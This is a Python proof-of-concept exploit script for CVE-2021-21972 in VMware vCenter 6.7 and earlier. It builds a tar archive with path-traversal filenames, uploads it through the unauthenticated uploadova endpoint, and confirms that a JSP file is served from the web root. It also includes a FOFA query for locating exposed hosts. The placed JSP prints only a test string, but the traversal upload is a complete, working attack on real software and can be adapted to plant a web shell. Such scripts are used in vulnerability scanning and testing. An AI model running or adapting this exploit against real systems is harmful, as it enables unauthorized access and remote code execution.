#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import tarfile
import io
from Config.config_proxies import proxies
from Config.config_requests import headers


requests.packages.urllib3.disable_warnings()


# 脚本信息
######################################################
NAME='CVE-2021-21972'
AUTHOR="境心"
REMARK='VCenter6.7及以下版本任意文件上传漏洞'
FOFA_RULE='title="+ ID_VC_Welcome +"'
######################################################

#  内存生成poc tar文件
def content_poc(target):
    windows_filename = "../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/test.jsp"
    linux_filename = "../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/41/0/h5ngc.war/resources/test.jsp"
    content = """<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<% out.print("this is a friendly test, Please check and repair upload vulnerabilities.");
%>"""
    system_type = ve_system_poc(target)
    if system_type is not None:
        mem_string = io.BytesIO()
        tr_file = tarfile.open(fileobj=mem_string, mode='w')
        if system_type == "windows":
            info = tarfile.TarInfo(name=windows_filename)
            info.size = len(content)
            tr_file.addfile(info, io.BytesIO(content.encode('utf-8')))
            tr_file.close()
        elif system_type == "linux":
            info = tarfile.TarInfo(name=linux_filename)
            info.size = len(content)
            tr_file.addfile(info, io.BytesIO(content.encode('utf-8')))
            tr_file.close()
        return mem_string,system_type

# 判断系统类型1
def ve_system(target):
    ve_url = target + '/Ui/vropspluginui/rest/services/uploadova'
    res1 = requests.get(ve_url, headers=headers, verify=False, timeout=5,proxies=proxies)
    return res1.status_code

# 判断系统类型2
def ve_system_poc(target):
    vurl = target + '/ui/vropspluginui/rest/services/uploadova'
    ve_res = requests.get(vurl, headers=headers, verify=False, timeout=5,proxies=proxies)
    if ve_res.status_code == 405:
        if ve_system(target) == ve_res.status_code:
            return "windows"
        else:
            return "linux"
    else:
        return True

def poc(target):
    result = {}
    vurl = target + '/ui/vropspluginui/rest/services/uploadova'
    mem_string,system_type = content_poc(target)
    # 移动读写位置到最开始
    mem_string.seek(0)
    file = [('uploadFile', ('test.tar', mem_string.read(), 'application/x-tar'))]
    res = requests.post(vurl, files=file, headers=headers, verify=False, timeout=5,proxies=proxies)
    if "SUCCESS" in res.text:
        if system_type == "windows":
            poc_url = target + "/statsreport/test.jsp"
        elif system_type == "linux":
            poc_url = target + "/ui/resources/test.jsp"
        res_1 = requests.get(poc_url, headers=headers, verify=False, timeout=5,proxies=proxies)
        if res_1.status_code == 200 and "this is a friendly test" in res_1.text:
            result['poc'] = NAME
            result['vurl'] = vurl
            result['pocurl'] = poc_url
        return result

if __name__ == '__main__':
    # poc调用
    poc("http://127.0.0.1")